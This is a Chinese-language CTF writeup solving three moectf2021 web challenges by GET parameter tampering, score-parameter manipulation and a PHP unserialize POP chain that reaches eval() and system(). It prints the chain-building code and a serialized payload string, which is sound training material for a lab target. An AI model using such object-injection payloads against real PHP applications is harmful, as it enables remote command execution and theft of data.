# Writeup for Web

临时接到出web题的任务，于是就在moectf2021里选了三道题，大家也可以参考官方writeup.
## get_problem
发现我们只需要向ats传入flag参数我们就能获得flag

**payload:**
```php
?ats=flag
```

## 2048
在进行完一把游戏之后，我们可以发现我们需要50000分获得flag，~~于是我们可以直接玩到50000分~~ 我们在游戏结束之后通过抓包发现存在传入flag.php的score参数，传输的是本次游戏的分数，我们将分数改为大于50000的任意数字便可得到flag


## unserilize
这道题考的是一个简单的pop链,我们通过简单构造便可获得
```php
<?php

class entrance
{
    public $start;

    function __construct($start)
    {
        $this->start = $start;
    }

    function __destruct()
    {
        $this->start->helloworld();
    }
}

class springboard
{
    public $middle;

    function __call($name, $arguments)
    {
        echo $this->middle->hs;
    }
}

class evil
{
    public $end;

    function __construct($end)
    {
        $this->end = $end;
    }

    function __get($Attribute)
    {
        eval($this->end);
    }
}

if(isset($_GET['serialize'])) {
    unserialize($_GET['serialize']);
} else {
    highlight_file(__FILE__);
}

$a = new entrance(new springboard());
$a->start->middle = new evil("'system('cat flag.php');");
echo serialize($a);
```
把输出的字符串get方法传到 serialize 里便可以得到flag
**payload**
```php
?serialize=O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:2:"ls";}}}
```

**PS**

 不出意外的话，这道题应该是没有意外的。但是我在搭靶机的时候忘记把里面的动态 flag 删掉了，导致有几位大佬在反序列化之后直接抓到了 flag 而忽略了本文件夹里的 flag.php 文件，然后 flag.php 也没有设置访问权限限制，导致了耽误了大家的时间。在这里给各位大佬说一声对不起 (orz orz orz) 。